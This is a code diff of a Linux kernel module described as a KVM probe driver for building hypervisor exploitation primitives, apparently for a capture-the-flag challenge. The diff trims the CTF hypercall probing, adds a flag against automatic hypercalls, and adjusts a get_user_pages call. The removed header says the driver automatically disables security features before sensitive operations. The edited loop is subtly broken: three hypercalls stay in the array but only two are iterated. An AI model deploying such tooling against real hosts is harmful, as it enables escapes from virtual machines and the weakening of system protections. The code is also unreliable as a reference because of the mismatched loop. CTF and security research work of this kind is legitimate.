@@ -1,15 +1,3 @@
-/* 
- * KVM Probe Driver - Core Infrastructure v2.2
- * Builds KVM exploitation primitives step by step
- * 
- * FIXES:
- * - CR register writes now use direct assembly for better control
- * - Auto-disable security features before sensitive operations
- * - Enhanced hypercall support with better result parsing
- * - Guest memory mapping and gap analysis
- * - Added cache operations and AHCI support
- */
-
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/init.h>
@@ -64,6 +52,7 @@ static bool g_kaslr_initialized = false;
 
 /* Security feature states */
 static int g_auto_disable_security = 1;  /* Auto-disable before operations */
+static int g_auto_hypercalls = 0;  /* DISABLED by default to prevent DoS */
 
 /* ========================================================================
  * IOCTL Definitions
@@ -600,9 +589,9 @@ static void run_ctf_hypercalls(void)
 {
     unsigned long ret;
     int i;
-    const unsigned long hypercalls[] = {100, 101, 102, 103};
+    const unsigned long hypercalls[] = {100, 101, 102};
     
-    for (i = 0; i < 4; i++) {
+    for (i = 0; i < 2; i++) {
         ret = do_kvm_hypercall(hypercalls[i], 0, 0, 0, 0);
         if (ret != 0 && ret != ~0UL) {
             printk(KERN_INFO "%s: [CTF] Hypercall %lu returned 0x%lx\n",
@@ -625,7 +614,6 @@ static void run_ctf_hypercalls_batch(struct hypercall_batch_result *result)
     result->ret_100 = do_kvm_hypercall(100, 0, 0, 0, 0);
     result->ret_101 = do_kvm_hypercall(101, 0, 0, 0, 0);
     result->ret_102 = do_kvm_hypercall(102, 0, 0, 0, 0);
-    result->ret_103 = do_kvm_hypercall(103, 0, 0, 0, 0);
     
     if (result->ret_100 != 0 && result->ret_100 != ~0UL)
         printk(KERN_INFO "%s: [CTF] HC100: 0x%lx\n", DRIVER_NAME, result->ret_100);
@@ -633,8 +621,7 @@ static void run_ctf_hypercalls_batch(struct hypercall_batch_result *result)
         printk(KERN_INFO "%s: [CTF] HC101: 0x%lx\n", DRIVER_NAME, result->ret_101);
     if (result->ret_102 != 0 && result->ret_102 != ~0UL)
         printk(KERN_INFO "%s: [CTF] HC102: 0x%lx\n", DRIVER_NAME, result->ret_102);
-    if (result->ret_103 != 0 && result->ret_103 != ~0UL)
-        printk(KERN_INFO "%s: [CTF] HC103: 0x%lx\n", DRIVER_NAME, result->ret_103);
+
 }
 #else
 static void run_ctf_hypercalls(void) {}
@@ -1342,7 +1329,7 @@ static int convert_hva_to_pfn(unsigned long hva, struct hva_to_pfn_request *req)
         mmap_read_lock(current->mm);
         
         #if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 9, 0)
-        ret = get_user_pages(hva, 1, FOLL_GET, &page, NULL);
+        ret = get_user_pages(hva, 1, FOLL_GET, &page);
         #elif LINUX_VERSION_CODE >= KERNEL_VERSION(4, 9, 0)
         ret = get_user_pages(hva, 1, FOLL_GET | FOLL_FORCE, &page, NULL);
         #else
